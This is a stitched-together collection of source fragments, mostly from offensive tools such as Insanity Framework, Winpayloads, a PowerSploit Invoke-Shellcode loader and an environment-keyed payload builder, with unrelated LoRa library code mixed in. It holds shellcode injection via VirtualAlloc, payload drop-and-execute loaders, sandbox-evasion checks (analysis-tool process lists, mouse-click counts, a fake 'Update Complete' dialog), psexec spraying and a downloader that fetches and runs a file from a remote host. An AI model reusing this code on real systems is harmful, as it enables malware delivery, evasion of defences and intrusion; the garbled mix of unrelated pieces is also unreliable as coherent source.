#!/usr/bin/python<N># -*- coding: iso-8859-15 -*-<N># Copyright 2017 Insanity Framework (IF) <N># Written by: * Alisson Moretto - 4w4k3<N># https://github.com/4w4k3/Insanity-Framework<N># Licensed under the BSD-3-Clause<N>import os<N>import sys<N>import time<N>import os<N>from bin.settings import exec_com<N><N><N>BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'<N><N>
#!/usr/bin/env python<N># Copyright 2017 Insanity Framework (IF)<N># Written by: * Alisson Moretto - 4w4k3<N>#             * Thomas Perkins  - Ekultek<N># https://github.com/4w4k3/Insanity-Framework<N># Licensed under the BSD-3-Clause<N>from Crypto.Cipher import AES<N>from base64 import b64encode<N>import string<N>import random<N><N><N>KEY_LENGTH = 32<N>RANDOM_STRING_PAYLOAD = ''.join(random.sample((string.ascii_uppercase + string.digits), KEY_LENGTH))<N>PAD = '@'<N><N>
#!/usr/bin/python<N># -*- coding: iso-8859-15 -*-<N># Copyright 2017 Insanity Framework (IF) <N># Written by: * Alisson Moretto - 4w4k3<N># https://github.com/4w4k3/Insanity-Framework<N># Licensed under the BSD-3-Clause<N>import os<N>import sys<N>import time<N>from bin.settings import exec_com<N>from bin.settings import RED, WHITE, END<N><N>if not os.geteuid() == 0:<N>    sys.exit('Insanity must be run as root')<N><N>
#!/usr/bin/python<N># -*- coding: iso-8859-15 -*-<N># Copyright 2017 Insanity Framework (IF) <N># Written by: * Alisson Moretto - 4w4k3<N># https://github.com/4w4k3/Insanity-Framework<N># Licensed under the BSD-3-Clause<N>import subprocess<N>import urllib2<N><N><N>def update_client_version(version):<N>    with open("version.txt", "r") as vnum:<N>        if vnum.read() != version:<N>            return True<N>        else:<N>            return False<N><N>
<N>def main():<N>    version = urllib2.urlopen("https://raw.githubusercontent.com/4w4k3/Insanity-Framework/master/version.txt").read()<N>    if update_client_version(version) is True:<N>        subprocess.call(["git", "pull", "origin", "master"])<N>        return "[*] Updated to latest version: v{}..".format(version)<N>    else:<N>        return "[*] You are already up to date with git origin master."<N><N>
import subprocess<N>import psutil<N><N>N_PROCS = 16<N><N>def fastercoll(prefix):<N>	with open("/tmp/prefix.bin", "wb") as pf:<N>		pf.write(prefix)<N>	procs_list = []<N>	for i in range(N_PROCS):<N>		subproc = subprocess.Popen([<N>			"./fastcoll/fastcoll",<N>			"/tmp/prefix.bin",<N>			"-o",<N>			f"/tmp/out{i}a.bin",<N>			f"/tmp/out{i}b.bin"<N>		], stdout=subprocess.DEVNULL)<N>		procs_list.append(psutil.Process(subproc.pid))<N><N>
	dead = set()<N>	res = []<N><N>	def callback(proc):<N>		i = procs_list.index(proc)<N>		if not dead: # we're the first to die<N>			res.append(open(f"/tmp/out{i}a.bin", "rb").read())<N>			res.append(open(f"/tmp/out{i}b.bin", "rb").read())<N>		dead.add(proc)<N>		for other in procs_list:<N>			if other not in dead:<N>				other.kill()<N><N>	while True: <N>		_, alive = psutil.wait_procs(procs_list, callback=callback)<N>		if not alive:<N>			break<N><N>
	return res<N><N>if __name__ == "__main__":<N>	orig_prefix = b""<N>	prefix = orig_prefix<N>	blocks_a = []<N>	blocks_b = []<N>	for i in range(0x10):<N>		print(i)<N>		a, b = fastercoll(prefix)<N>		blocks_a.append(a)<N>		blocks_b.append(b)<N>		prefix += a<N><N>	with open("full_a.bin", "wb") as fa:<N>		fa.write(orig_prefix + b"".join(blocks_a))<N><N>	with open("full_b.bin", "wb") as fa:<N>		fa.write(orig_prefix + b"".join(blocks_b))<N><N><N>
from fastercoll import fastercoll<N>from tqdm import tqdm<N><N>monomorph = bytearray(open("loader/monomorph", "rb").read())<N><N>idx = monomorph.index((0xdeadbeef).to_bytes(4, "little"))<N>max_payload_len = int.from_bytes(monomorph[idx+4:idx+4+4], "little")<N><N>num_collisions = 1 + 32 + max_payload_len * 8<N><N>print(f"generating {hex(num_collisions)} collisions...")<N><N>prefix = monomorph[:idx+128]<N><N>
#!/usr/bin/env python<N><N>from pyparsing import cppStyleComment,dblQuotedString<N>import re<N>import sys<N><N>###################<N>## Careful with the removing of print statements<N>## This can cause major issues if we delete a print statements and it's the only<N>## on the line or in the function :-/<N>###################<N>def removeCommentsGo(fStr,fName='',removePrint=False):<N>	<N>	returnStr = fStr<N>	raw_lookup_table = ''<N>	lookup_table=''<N>	fixStr = ''<N><N>
	# First remove the large blobs of data so we don't hit memory faults :-/<N>	raw_lookup_table_query = re.compile(r'    raw_lookup_table.*?\n',re.I)<N>	lookup_table_query = re.compile(r'    lookup_table.*?\n',re.I)<N><N>	try:<N>		raw_lookup_table = re.search(raw_lookup_table_query,returnStr).group()<N>	except: raw_lookup_table = ''<N><N>	try:<N>		lookup_table = re.search(lookup_table_query,returnStr).group()<N>	except: lookup_table = ''<N><N>
imports=["strings","encoding/hex", "os"]<N><N><N>buildcode="""<N>func pull_environmentals(environmentals []string) string {<N>    env_string := ""<N>    for _,itr := range environmentals {<N>        env_string += os.Getenv(itr)<N>    }<N>    return(strings.ToLower(env_string))<N>}<N>"""<N><N>callcode="""<N>    key_combos[i] = []string{pull_environmentals(env_vars)}<N>    i += 1<N><N>"""
buildcode = """<N>package main<N><N>/*<N>#cgo CFLAGS: -IMemoryModule<N>#cgo LDFLAGS: MemoryModule/build/MemoryModule.a<N>#include "MemoryModule/MemoryModule.h"<N>*/<N>import "C"<N><N>import (<N>    {6}<N>)<N><N>//Checks and aborts on bad errors<N>func check(e error) {{<N>    if e != nil {{<N>        fmt.Println("[!] Error Reported: ",e)<N>    }}<N>}}<N><N>/*<N>=======================<N>== Walk'in componenets<N>=======================<N>*/<N><N>
buildcode="""<N>package main<N><N>/*<N>#cgo CFLAGS: -IMemoryModule<N>#cgo LDFLAGS: MemoryModule/build/MemoryModule.a<N>#include "MemoryModule/MemoryModule.h"<N>*/<N>import "C"<N><N>import (<N>        {5}<N>)<N><N>func check(e error) bool{{<N>    if e != nil {{<N>        return false<N>    }}<N>    return true<N>}}<N><N><N>func decrypt(payload []byte, payload_hash []byte, otp string, minus_bytes int) []byte{{<N>    var key_location uint32<N>    var key_len uint16<N><N>
imports=["time", "fmt"]<N><N>buildcode="""<N>func get_system_time() []string{<N>	p := fmt.Sprintf<N>	t := time.Now()<N>	timeList := []string{}<N><N>	timeList = append(timeList,p("%d%02d%02d",t.Year(),t.Month(),t.Day()))<N>	timeList = append(timeList,p("%d%02d00",t.Year(),t.Month()))<N>	timeList = append(timeList,p("%d0000",t.Year()))<N><N>	return timeList<N>}<N>"""<N><N>callcode="""<N>	key_combos[i] = get_system_time()<N>	i += 1<N><N>"""<N>
buildcode="""<N>function Get-theEnvironmentals($env_vars){<N>	$env_string = ""<N>	foreach ($env_var in $env_vars){<N>		$env_string +=[Environment]::GetEnvironmentVariable($env_var)<N>	}<N>	return $env_string<N>}<N><N><N>"""<N><N>callcode="""<N>	$key_combos += ,(Get-theEnvironmentals $env_vars)<N>"""
buildcode="""<N>function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{<N>    $sha512 = new-Object System.Security.Cryptography.SHA512Managed<N>    $end = $payload.Length - $minus_bytes -1<N>    $compHash = $sha512.ComputeHash($payload)<N>    if ([System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "").Equals($payload_hash)) {{<N>        return 1<N>    }} Else {{<N>        return 0<N>    }}<N>}}<N><N>
buildcode="""<N>function Get-SystemTime(){<N>	$time_mask = @()<N>	$the_time = Get-Date<N>	$time_mask += [string]$the_time.Year + "0000"<N>	$time_mask += [string]$the_time.Year + [string]$the_time.Month + "00"<N>	$time_mask += [string]$the_time.Year + [string]$the_time.Month + [string]$the_time.Day<N>	return $time_mask<N>}<N><N>"""<N><N>callcode="""<N>	$key_combos += ,(Get-SystemTime)<N>"""
loader="""<N>$file_drop_output = "file_drop_output" + "{0}"<N><N>if ($payload.GetType().Name -eq "String"){{<N>	$payload | Out-File $file_drop_output<N>}} else {{<N>	[io.file]::WriteAllBytes($file_drop_output, $payload)	<N>}}<N><N>"""
loader="""<N>function Invoke-Shellcode<N>{<N><#<N>.SYNOPSIS<N><N>Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.<N><N>PowerSploit Function: Invoke-Shellcode<N>Author: Matthew Graeber (@mattifestation)<N>License: BSD 3-Clause<N>Required Dependencies: None<N>Optional Dependencies: None<N> <N>.DESCRIPTION<N><N>Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre<N><N>
PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):<N><N>msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- <N><N>Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.<N> <N>.PARAMETER ProcessID<N><N>
Process ID of the process you want to inject shellcode into.<N><N>.PARAMETER Shellcode<N><N>Specifies an optional shellcode passed in as a byte array<N><N>.PARAMETER Force<N><N>Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.<N><N>.EXAMPLE<N><N>C:\PS> Invoke-Shellcode -ProcessId 4274<N><N>Description<N>-----------<N>Inject shellcode into process ID 4274.<N><N>
.EXAMPLE<N><N>C:\PS> Invoke-Shellcode<N><N>Description<N>-----------<N>Inject shellcode into the running instance of PowerShell.<N><N>.EXAMPLE<N><N>C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)<N>    <N>Description<N>-----------<N>Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)<N>Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!<N>#><N><N>
buildcode="""<N>def pull_environmentals(environmentals):<N>    env_string = ''<N>    for env_var in environmentals:<N>        try:<N>        	env_string += os.getenv(env_var)<N>        except:<N>        	pass<N>        	<N>    return env_string.lower()<N>    <N>"""<N><N>callcode="""<N>    key_combos.append(pull_environmentals(env_vars))<N>"""
#Make mask<N><N>buildcode="""<N>def get_mac_addr():<N>	from uuid import getnode<N>	hex(getnode())<N>"""<N><N><N>callcode="""<N>	key_combos.append(get_mac_addr())<N>"""
'''<N>System time will be return in a list<N>with the following masks<N>[YYYY0000, YYYYMM00, YYYYMMDD]<N>'''<N><N>buildcode="""<N>def get_system_time():<N>    import time<N>    time_mask = []<N>    time_mask.append(time.strftime("%Y%m%d"))<N>    time_mask.append(time.strftime("%Y%m00"))<N>    time_mask.append(time.strftime("%Y0000"))<N>    return time_mask<N>"""<N><N>callcode="""<N>    key_combos.append(get_system_time())<N>"""
loader="""<N>file_drop_output = "file_drop_output" + str(r"{0}")<N><N>with open(file_drop_output, 'w') as f:<N>	f.write(self.payload)<N><N>"""
loader="""<N>import subprocess<N>import os<N>import tempfile<N><N>fd, path = tempfile.mkstemp(suffix='.exe')<N><N>os.write(fd, self.payload)<N>os.close(fd)<N><N>try:<N>	result = subprocess.call(path)<N>finally:<N>	os.remove(path)<N><N>"""<N>
loader="""<N>import ctypes<N>import struct<N><N>shellcode = bytearray(self.payload)<N>ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),<N>                                          ctypes.c_int(len(shellcode)),<N>                                          ctypes.c_int(0x3000),<N>                                          ctypes.c_int(0x40))<N><N>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)<N><N>
#!/usr/bin/env python<N><N>import os<N>import sys<N><N>from setuptools import setup<N><N>from lora import VERSION<N><N>package_name = "python-lora"<N><N>if sys.argv[-1] == "publish":<N>    os.system("python setup.py sdist")<N>    os.system("twine upload -r pypi dist/%s-%s.tar.gz" % (package_name, VERSION))<N>    sys.exit()<N><N>if sys.argv[-1] == "tag":<N>    os.system("git tag -a v{} -m 'tagging v{}'".format(VERSION, VERSION))<N>    os.system("git push && git push --tags")<N>    sys.exit()<N><N>
import random<N>import sys<N>from binascii import unhexlify<N><N>from cryptography.hazmat.backends import default_backend<N>from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes<N><N>UP_LINK = 0<N>DOWN_LINK = 1<N><N><N>def to_bytes(s):<N>    """<N>    PY2/PY3 compatible way to convert to something cryptography understands<N>    """<N>    if sys.version_info < (3,):<N>        return "".join(map(chr, s))<N>    else:<N>        return bytes(s)<N><N>
from __future__ import print_function<N><N>from xml.etree import ElementTree<N><N>from .crypto import loramac_decrypt<N><N>WKT_POINT_FMT = "SRID=4326;POINT({lng} {lat})"<N><N><N>class LoRaPayload(object):<N>    """Wrapper for an actility LoRa Payload"""<N><N>    XMLNS = "{http://uri.actility.com/lora}"<N><N>    def __init__(self, xmlstr):<N>        self.payload = ElementTree.fromstring(xmlstr)<N><N>
        if self.payload.tag != self.XMLNS + "DevEUI_uplink":<N>            raise ValueError(<N>                "LoRaPayload expects an XML-string containing a "<N>                "DevEUI_uplink tag as root element as argument"<N>            )<N><N>    def __getattr__(self, name):<N>        """<N>        Get the (text) contents of an element in the DevEUI_uplink XML, allows<N>        accessing them as properties of the objects:<N><N>
        >>> payload = LoRaPayload('<?xml version="1.0" encoding="UTF-8"?>...')<N>        >>> payload.payload_xml<N>        '11daf7a44d5e2bbe557176e9e6c8da'<N>        """<N>        try:<N>            return self.payload.find(self.XMLNS + name).text<N>        except AttributeError:<N>            print("Could not find tag with name: {}".format(name))<N><N>    def decrypt(self, key, dev_addr):<N>        """<N>        Decrypt the actual payload in this LoraPayload.<N><N>
#!/usr/bin/python<N>from lib.main import *<N>from lib.payloadextras import *<N>from lib.startmetasploit import *<N>from lib.menu import *<N><N><N>try:<N>    from lib.psexecspray import *<N>except:<N>    print t.bold_red + "[!] Rerun the setup.sh" + t.normal<N><N>if not re.search('winpayloads', os.getcwd().lower()):<N>    print t.bold_red + "[!!] Please Run From Winpayloads Dir" + t.normal<N>    sys.exit(1)<N><N>
import Crypto.Cipher.AES as AES<N>import os<N>import random<N>import string<N>import requests<N>from HTMLParser import HTMLParser<N>import re<N>import blessed<N><N>t = blessed.Terminal()<N><N>def randomVar():<N>    return ''.join(random.sample(string.ascii_lowercase, 8))<N><N>def randomJunk():<N>    newString = ''<N>    for i in xrange(random.randint(1, 10)):<N>        newString += ''.join(random.sample(string.ascii_lowercase, random.randint(1, 26)))<N>    return newString<N><N>
from __future__ import unicode_literals<N>from main import *<N>from payloadextras import *<N>from startmetasploit import *<N>from generatepayload import *<N>from preparepayload import *<N>from stager import *<N>import glob<N><N>GetIP = InterfaceSelecta()<N><N><N>def returnIP():<N>    return GetIP.ChooseInterface()['addr']<N><N>def returnINTER():<N>    return str(GetIP.ChooseInterface()['interface'])<N><N>
def doInterfaceSelect():<N>    GetIP.ChooseInterface(set=True)<N>    return "clear"<N><N>def menuRaise():<N>    if killAllClients():<N>        raise KeyboardInterrupt<N><N>def noColourLen(colourString):<N>    return len(re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]').sub('', colourString))<N><N>def noColourCenter(colourString):<N>    len = (t.width / 2) - (noColourLen(colourString) /2 )<N>    if len % 2 > 0:<N>        len -= 1<N>    return (' ' * len) + colourString<N><N>
def cleanUpPayloads():<N>    payloadsRemoved = 0<N>    for i in glob.glob(payloaddir() + "/*.exe"):<N>        os.remove(i)<N>        payloadsRemoved += 1<N>    print t.bold_green + "[*] %s Payloads removed...."% payloadsRemoved + t.normal<N>    return "clear"<N><N>def getAndRunSandboxMenu():<N>    sandboxMenu = MenuOptions(sandboxMenuOptions, menuName="Sandbox Menu")<N>    sandboxMenu.runmenu()<N>    return "pass"<N><N>
#!/usr/bin/python<N># Copyright (c) 2003-2016 CORE Security Technologies<N>#<N># This software is provided under under a slightly modified version<N># of the Apache Software License. See the accompanying LICENSE file<N># for more information.<N>#<N># PSEXEC like functionality example using RemComSvc (https://github.com/kavika13/RemCom)<N>#<N># Author:<N>#  beto (@agsolino)<N>#<N># Reference for:<N>#  DCE/RPC and SMB.<N><N>
import sys<N>import os<N>import cmd<N>import logging<N>from threading import Thread, Lock<N>import argparse<N>import random<N>import string<N>import time<N><N>try:<N>    from impacket.examples import logger<N>except:<N>    from impacket import logger<N><N>from impacket import version, smb<N>from impacket.smbconnection import SMBConnection<N>from impacket.dcerpc.v5 import transport<N>from impacket.structure import Structure<N>from impacket.examples import remcomsvc, serviceinstall<N><N>
<N>class RemComMessage(Structure):<N>    structure = (<N>        ('Command','4096s=""'),<N>        ('WorkingDir','260s=""'),<N>        ('Priority','<L=0x20'),<N>        ('ProcessID','<L=0x01'),<N>        ('Machine','260s=""'),<N>        ('NoWait','<L=0'),<N>    )<N><N>class RemComResponse(Structure):<N>    structure = (<N>        ('ErrorCode','<L=0'),<N>        ('ReturnCode','<L=0'),<N>    )<N><N>
#<N>#	 Checks all loaded process names, Python<N>#	 Module written by Brandon Arvanaghi<N>#	 Website: arvanaghi.com<N>#	 Twitter: @arvanaghi<N>#	Edited for use in winpayloads<N><N>import win32pdh<N>import sys<N><N>EvidenceOfSandbox = []<N>sandboxProcesses = "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"<N><N>
#<N>#   Waits until N mouse clicks occur before executing (default: 10), Python<N>#   Module written by Brandon Arvanaghi<N>#   Website: arvanaghi.com<N>#   Twitter: @arvanaghi<N>#	Edited for use in winpayloads<N><N>import win32api<N>import sys<N><N>count = 0<N>*minClicks* = $10$<N><N>while count < minClicks:<N>	new_state_left_click = win32api.GetAsyncKeyState(1)<N>	new_state_right_click = win32api.GetAsyncKeyState(2)<N><N>	if new_state_left_click % 2 == 1:<N>		count += 1<N>	if new_state_right_click % 2 == 1:<N>		count += 1<N>
#<N>#   Minimum disk size checker (default: 50 GB), Python<N>#   Module written by Brandon Arvanaghi<N>#   Website: arvanaghi.com<N>#   Twitter: @arvanaghi<N>#	Edited for use in winpayloads<N><N>import win32api<N>import sys<N><N>*minDiskSizeGB* = $50$<N><N><N>_, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()<N><N>diskSizeGB = diskSizeBytes/1073741824<N><N>if diskSizeGB > minDiskSizeGB:<N>    pass<N>else:<N>    sys.exit()<N>
#<N>#   Minimum Registry size checker (default: 55 MB), Python<N>#   Module written by Brandon Arvanaghi<N>#   Website: arvanaghi.com<N>#   Twitter: @arvanaghi<N>#	Edited for use in winpayloads<N><N>import sys<N>import win32com<N>from win32com.client import GetObject<N><N>*minRegistrySizeMB* = $55$<N><N>regObjects = GetObject("winmgmts:").ExecQuery("SELECT CurrentSize FROM Win32_Registry")<N><N>for regObject in regObjects:<N>	if int(regObject.Properties_('CurrentSize')) > minRegistrySizeMB:<N>		pass<N>	else:<N>		sys.exit()<N>
#<N>#<N>#   Module written by Brandon Arvanaghi<N>#   Website: arvanaghi.com<N>#   Twitter: @arvanaghi<N>#	Edited for use in winpayloads<N><N>import sys<N>import getpass<N><N>*username* = $'administrator'$<N><N>if getpass.getuser().lower() == username.lower():<N>    pass<N>else:<N>    sys.exit()<N>
#<N>#   Prompts user with dialog box and waits for response before executing, Python<N>#   Module written by Brandon Arvanaghi<N>#   Website: arvanaghi.com<N>#   Twitter: @arvanaghi<N>#	Edited for use in winpayloads<N><N>import ctypes<N>import sys<N><N>dialogBoxTitle = "Update Complete";<N>dialogBoxMessage = "Press OK to Continue"<N><N>MessageBox = ctypes.windll.user32.MessageBoxW<N>MessageBox(None, dialogBoxMessage, dialogBoxTitle, 0)<N>
import sys, base64, codecs, binascii<N><N>def getjsonlist():<N>    payloads = {<N>        "one_line":{<N>            "hex":"oneline_hex",<N>            "base64":"oneline_b64",<N>            "base32":"oneline_b32",<N>            "gunzip*":"oneline_gzip",<N>            "rot13*":"oneline_rot13",<N>            },<N>        "powershell":{<N>            "base64_pythonexec":"ps_b64_exec",<N>            "base64_hidden_pythonexec":"ps_b64_hidden_exec",<N>            }<N>        }<N>    return payloads<N><N>
from platform import platform, architecture   # Importa a função para obter o OS e arquitetura<N>from urllib import urlretrieve  # Importa a função para fazer download de arquivos<N>from subprocess import call     # Importa a função para chamar comandos no shell<N>def obterArch():<N>    global arch<N>    if architecture()[0] == '64bit':<N>        arch = 'x64'<N>    else:<N>        arch = 'x86'<N><N>
def obterOS():  # Função para definir o OS<N>    if platform()[0] == 'W':<N>        return True<N>    else:<N>        return False<N><N>def init(): # Função para fazer o download do arquivo e chamar no shell<N>    urlF = 'http://%s/%s/%s' % (host, arch, url)<N>    urlretrieve(urlF, url)<N>    if obterOS() == True:<N>        call('call ' + url, shell=True)<N>    else:<N>        call('chmod +x ' + url, shell=True)<N>        call('./' + url, shell=True)<N><N>
